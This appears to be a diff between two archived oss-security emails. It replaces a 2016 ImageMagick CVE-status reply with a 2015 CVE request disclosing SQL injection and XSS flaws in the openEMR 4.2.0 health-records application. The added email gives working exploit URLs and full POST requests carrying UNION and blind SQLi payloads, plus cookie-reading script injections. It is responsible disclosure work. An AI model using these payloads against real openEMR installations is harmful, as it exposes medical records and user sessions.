@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4477" "Saturday" "21" "May" "2016" "08:31:23" "+0930" "Simon Lees" "sflees@suse.de" "<573F9743.90309@suse.de>" "113" "Re: [oss-security] ImageMagick Is On Fire -- CVE-2016-3714" "^Date:" nil nil "5" "2016052023:01:23" "[oss-security] ImageMagick Is On Fire -- CVE-2016-3714" (number mark "        sflees@suse. May 21  113/4477  " thread-indent "\"Re: [oss-security] ImageMagick Is On Fire -- CVE-2016-3714\"\n") "<alpine.GSO.2.20.1605200827380.7756@freddy.simplesystems.org>" ("<CABi+pA7xDJhirUFbrVZQkwMnFj--zbNJA8_Aoq-SiJx0QNcsoA@mail.gmail.com>" "<20160503181505.GA8195@openwall.com>" "<57292879.7050303@gmail.com>" "<alpine.GSO.2.20.1605191154150.15930@freddy.simplesystems.org>" "<CANO=Ty26E=diToYAoedQB4JKTbnjykSy94ciE-XBNdyJBU0jNw@mail.gmail.com>" "<20160519190037.GA6411@perpetual.pseudorandom.co.uk>" "<3b0ab9e5-d160-c5fe-a554-a5ac61eede34@cpanel.net>" "<alpine.GSO.2.20.1605200827380.7756@freddy.simplesystems.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3792" "Sunday" "22" "March" "2015" "17:56:12" "+0100" "=?UTF-8?B?U3RlZmZlbiBSw7ZzZW1hbm4=?=" "steffen.roesemann1986@gmail.com" "<CALH-=7yNNrVGfD2u-+Yv7PLQ+tYi+qHcuYu4dD0H6GQQCdF21w@mail.gmail.com>" "124" "[oss-security] CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS- and SQLi vulns" nil nil nil "3" "2015032216:56:12" "[oss-security] CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS- and SQLi vulns" (number mark "        steffen.roes Mar 22  124/3792  " thread-indent "\"[oss-security] CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS- and SQLi vulns\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 9611 invoked by uid 550); 20 May 2016 23:01:54 -0000
+Received: (qmail 7472 invoked by uid 550); 22 Mar 2015 16:57:07 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,139 +11,150 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 9593 invoked from network); 20 May 2016 23:01:54 -0000
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-References: <CABi+pA7xDJhirUFbrVZQkwMnFj--zbNJA8_Aoq-SiJx0QNcsoA@mail.gmail.com>
- <20160503181505.GA8195@openwall.com> <57292879.7050303@gmail.com>
- <alpine.GSO.2.20.1605191154150.15930@freddy.simplesystems.org>
- <CANO=Ty26E=diToYAoedQB4JKTbnjykSy94ciE-XBNdyJBU0jNw@mail.gmail.com>
- <20160519190037.GA6411@perpetual.pseudorandom.co.uk>
- <3b0ab9e5-d160-c5fe-a554-a5ac61eede34@cpanel.net>
- <alpine.GSO.2.20.1605200827380.7756@freddy.simplesystems.org>
-Message-ID: <573F9743.90309@suse.de>
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
- Thunderbird/38.7.2
+Received: (qmail 6098 invoked from network); 22 Mar 2015 16:56:23 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:date:message-id:subject:from:to:content-type;
+        bh=EFE2GEnN+XySt+M7Rr6pR53mKRx7Y9sexTwxEcKaUnc=;
+        b=VTfZ/FwEEk25+iMqTXFO6yJYPG/7zIuQ2sJJM6x7EfiVLxPhzoiFnB9ZFeo5cerdeA
+         aZmD7Wns5OqkAuhtMHlx2MPcrPjL9vg+4jMaO4ABszwGifdaZItNzw3uOK1ctxJiPWD1
+         4JVnBO1V77s2J0ZXMkGQDdgUYPFnR0XZOrYoPqkfqYIc8ta2xM/ppIufpmh+oXm7KnC0
+         w6nHocOe9tTMcH2riiJ9b/yF8o3HksObQE7TBUQF0GUndpwLsmOwmo4Qpvee7FubWVtf
+         YM0+5/5OyFjWM5BERPKvlmv8H1qL7n1MLYLhJEkfwWsGP0QWq9v9Ro2nbqoWjgN2KM1d
+         Pa0w==
 MIME-Version: 1.0
-In-Reply-To: <alpine.GSO.2.20.1605200827380.7756@freddy.simplesystems.org>
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="794m6Nof1lFkkQOLoeKhbo9QFlPEnqold"
-Date: Sat, 21 May 2016 08:31:23 +0930
-From: Simon Lees <sflees@suse.de>
+X-Received: by 10.112.182.69 with SMTP id ec5mr77540703lbc.118.1427043372369;
+ Sun, 22 Mar 2015 09:56:12 -0700 (PDT)
+Message-ID: <CALH-=7yNNrVGfD2u-+Yv7PLQ+tYi+qHcuYu4dD0H6GQQCdF21w@mail.gmail.com>
+Content-Type: multipart/alternative; boundary=001a11c3686e4a0c5b0511e36de2
+Date: Sun, 22 Mar 2015 17:56:12 +0100
+From: =?UTF-8?Q?Steffen_R=C3=B6semann?= <steffen.roesemann1986@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] ImageMagick Is On Fire -- CVE-2016-3714
+Subject: [oss-security] CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS-
+ and SQLi vulns
 To: oss-security@lists.openwall.com
 
---794m6Nof1lFkkQOLoeKhbo9QFlPEnqold
-Content-Type: multipart/mixed; boundary="rEO4eXiHQh0Cldlu78wqBQtadqGBkfeKI"
-From: Simon Lees <sflees@suse.de>
-To: oss-security@lists.openwall.com
-Message-ID: <573F9743.90309@suse.de>
-Subject: Re: [oss-security] ImageMagick Is On Fire -- CVE-2016-3714
-References: <CABi+pA7xDJhirUFbrVZQkwMnFj--zbNJA8_Aoq-SiJx0QNcsoA@mail.gmail.com>
- <20160503181505.GA8195@openwall.com> <57292879.7050303@gmail.com>
- <alpine.GSO.2.20.1605191154150.15930@freddy.simplesystems.org>
- <CANO=Ty26E=diToYAoedQB4JKTbnjykSy94ciE-XBNdyJBU0jNw@mail.gmail.com>
- <20160519190037.GA6411@perpetual.pseudorandom.co.uk>
- <3b0ab9e5-d160-c5fe-a554-a5ac61eede34@cpanel.net>
- <alpine.GSO.2.20.1605200827380.7756@freddy.simplesystems.org>
-In-Reply-To: <alpine.GSO.2.20.1605200827380.7756@freddy.simplesystems.org>
-
---rEO4eXiHQh0Cldlu78wqBQtadqGBkfeKI
-Content-Type: text/plain; charset=windows-1252
+--001a11c3686e4a0c5b0511e36de2
+Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: quoted-printable
 
+Hi Steve, Josh, vendors, list.
+
+I found multiple reflecting/stored XSS- and SQLi-vulns in electronic health
+records and medical practice application openEMR v. 4.2.0.
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Technical Details:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+All below described vulnerabilities can only be exploited by an already
+authenticated user.
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+SQL injection vulnerabilities
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+An SQL injection vulnerability can be found in the facility_admin.php file
+and can be abused by an attacker via the fid-parameter.
+
+Exploit-Example:
+
+http://
+{TARGET}/interface/usergroup/facility_admin.php?fid=3D3%27+and+1=3D2+union+=
+select+1,user%28%29,3,4,version%28%29,database%28%29,7,8,9,10,11,12,13,14,1=
+5,16,17,18,19,20,21,22,23+--+
 
 
-On 05/20/2016 11:22 PM, Bob Friesenhahn wrote:
-> On Thu, 19 May 2016, John Lightsey wrote:
->>
->> This is the list I'm working off of. For RedHat and Debian, I only
->> checked the ImageMagick updates.
->>
->> CVE-2016-3718 - SSRF via HTTP and FTP coders
->> ImageMagick: Not fixed
->> GraphicsMagick: Not fixed
->> RedHat: Fixed
->> Debian: Fixed
->=20
-> The above topic is worthy of discussion.  What is a security issue in
-> some contexts is normal and necessary in others.
->=20
->> No CVE assigned - Heap overflow in PICT parser
->> ImageMagick: Fixed
->> GraphicsMagick: ??
->> RedHat: Not fixed
->> Debian: Not fixed
->> Reference: http://www.openwall.com/lists/oss-security/2016/05/11/3
->=20
-> The GraphicsMagick development code is not vulnerable to this one.
-> GraphicsMagick may have been vulnerable in the past.
->=20
->> No CVE assigned - Out of bounds read in the PSD parser
->> ImageMagick: Fixed
->> GraphicsMagick: ??
->> RedHat: Not fixed
->> Debian: Not fixed
->> Reference: http://www.openwall.com/lists/oss-security/2016/05/11/3
->=20
-> The GraphicsMagick development code is not vulnerable to this one.
-> GraphicsMagick may have been vulnerable in the past.
->=20
->> Are there other formats that are unsafe and should be removed using the
->> policy configuration files?
->=20
-> In interest of full-disclosure, the GraphicsMagick project has fixed
-> approximately 45 CVE-worthy issues since the last release, not including
-> issues covered by CVE-2016-2317 and CVE-2016-2318 (which are fixed in
-> the development code).  Many of the test files are published in full
-> open view on bug trackers or other places.
->=20
-> In a similar time-frame, the ImageMagick project has been provided a
-> great many files (likely more than 100) which crash the software and
-> many of these files are published in full open view on bug trackers or
-> other places.  Commits and other records show that problems are being
-> fixed.
->=20
-> When fixed versions are released, OS distributions which continue to
-> provide 3-year old releases are exposing users to releases with perhaps
-> hundreds of fixed vulnerabilities which can be triggered using
-> publically available files.
->=20
-> Bob
 
-Some distro's have customers that pay them to have the 3 year old
-version with only fixes to bugs as they wish to reduce the chance of
-breakage. I must thank you the email you published with the list of
-issues and there corresponding patches made it much much easier to
-address the issues in GraphicsMagick then it was for ImageMagick.
+Another (blind) SQL injection vulnerability resides in the
+appt_encounter_report.php an can be abused by an attacker by modifying a
+the form_facility-parameter in a POST-request.
 
---=20
+Exploit-Example:
 
-Simon Lees (Simotek)                            http://simotek.net
+POST /openemr-4.2.0/interface/reports/appt_encounter_report.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101
+Firefox/31.0 Iceweasel/31.3.0
+Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0.8
+Accept-Language: en-US,en;q=3D0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/openemr-4.2.0/interface/reports/appt_encounter_report.php
+Cookie: OpenEMR=3Dp30d0tu19a9r04tjgnuu1oqqq4
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 120
 
-Emergency Update Team                           keybase.io/simotek
-SUSE Linux                            Adeliade Australia, UTC+9:30
-GPG Fingerprint: 5B87 DB9D 88DC F606 E489 CEC5 0922 C246 02F0 014B
+form_facility=3D3%27+AND+substring(version(),1,1)=3D%275&form_from_date=3D2=
+015-01-13&form_to_date=3D2015-01-13&form_refresh=3Dtrue
 
 
---rEO4eXiHQh0Cldlu78wqBQtadqGBkfeKI--
+The last (blind) SQL injection vulnerability resides in the
+appointments_report.php-file and can be as well abused by an attacker via
+crafting own SQL statements in the form_facility-parameter in a POST
+request.
 
---794m6Nof1lFkkQOLoeKhbo9QFlPEnqold
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
 
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v2
+Exploit-Example:
 
-iQEcBAEBCAAGBQJXP5dQAAoJEBHULpq+GPyRmxcH/1lUJ/x4+564qJEMqnLY8LKu
-tz4dScjnABG5+Jpxd//1JbvaUfUJmjRJ4NC8u/tt0EnqENHCsFRpKXs6zSzlOvSo
-ov191AuOS6mgQMGECPrXi0Nqq9fsSCfulfMqEGOTAl5Gy63ELZjGA8iP+g6tpeW3
-9CxzmzsP+C93+AOunyLKvgbYDKlVmqON/ppt34XhODG7mS5/6eP8JrSLQA06oW1K
-xTJAISPwNPU6xBYMSYGv93ihtRwGrlKSJ3HfPUC6JMvu60MFPHIul5vkOHdH4t95
-8+LSzbefqR12WnkiD8Ne0VW1zONLH2Vj8gBSBC/bRANB7LOHXwoARSylfKRmBq0=
-=PEJy
------END PGP SIGNATURE-----
+POST /openemr-4.2.0/interface/reports/appointments_report.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101
+Firefox/31.0 Iceweasel/31.3.0
+Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0.8
+Accept-Language: en-US,en;q=3D0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/openemr-4.2.0/interface/reports/appointments_report.php
+Cookie: OpenEMR=3Dp30d0tu19a9r04tjgnuu1oqqq4
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 199
 
---794m6Nof1lFkkQOLoeKhbo9QFlPEnqold--
+form_facility=3D3%27+and+substring(version(),1,1)=3D%274&form_provider=3D&f=
+orm_from_date=3D2015-01-13&form_to_date=3D2015-01-13&form_apptstatus=3D&for=
+m_apptcat=3DALL&form_orderby=3Dcomment&patient=3D&form_refresh=3Dtrue
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+XSS vulnerabilities
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+A reflecting XSS-vulnerability can be found in user_admin.php via the
+id-parameter.
+
+Exploit-Example:
+
+http://
+{TARGET}interface/usergroup/user_admin.php?id=3D4%22%3E%3Cscript%3Ealert%28=
+document.cookie%29%3C/script%3E
+
+
+
+A stored XSS vulnerability resides in add_edit_event.php via the
+input-field "form_comments" and is executed in appointments_report.php.
+
+
+Exploit-Example:
+
+<script>alert(document.cookie)</script>
+
+
+Can I get a CVE-ID / CVE-IDs for my findings?
+
+Thank you very much.
+
+Greetings from Germany.
+
+Steffen R=C3=B6semann
+
+
+References:
+
+[1] http://www.open-emr.org
+[2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-08.html
+[3] http://www.open-emr.org/wiki/index.php/OpenEMR_Patches
+[4] http://seclists.org/fulldisclosure/2015/Mar/145
+
+--001a11c3686e4a0c5b0511e36de2--
